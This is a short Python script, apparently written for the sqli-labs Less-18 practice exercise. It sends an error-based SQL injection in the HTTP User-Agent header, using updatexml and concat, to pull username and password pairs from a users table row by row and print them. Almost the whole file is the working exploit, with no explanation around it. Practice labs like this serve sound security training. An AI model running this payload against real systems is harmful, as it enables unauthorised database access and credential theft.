#coding:utf-8
import requests

valuelen = 100

def getPostData(i):
    postdata = {"uname":"admin", "passwd":"123"}
    return postdata

def getHeader(i):
    useragent = "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit %s,1),0x7e),1) or '1'='1"%i
    header = {'User-Agent':useragent}
    return header

url = "http://10.0.2.15/sqli/Less-18/"
for i in range(0,valuelen):
    res = requests.post(url, data = getPostData(i), headers = getHeader(i))
    if "error" in res.content:
	print(res.content.split('~')[1])
    else:
	break

